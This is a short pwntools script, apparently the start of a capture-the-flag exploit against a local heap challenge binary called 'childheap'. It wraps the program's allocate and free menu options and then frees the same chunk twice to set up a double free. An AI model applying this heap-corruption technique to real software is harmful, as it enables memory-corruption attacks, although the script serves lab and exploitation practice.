from pwn import *
context.update(log_level = 'debug')

def Malloc(idx, size, data):
	p.sendlineafter('> ', '1')
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(size))
	p.sendlineafter(': ', data)
def Free(idx):	
	p.sendlineafter('> ', '2')
	p.sendlineafter(': ', str(idx))
p = process('childheap')
Malloc(0, 128, 'aaaaaa')
Malloc(1, 128, 'bbbbbb')
raw_input('debug: ' + str(p.pid))
Free(0)
Free(1)
Free(0)
p.interactive()
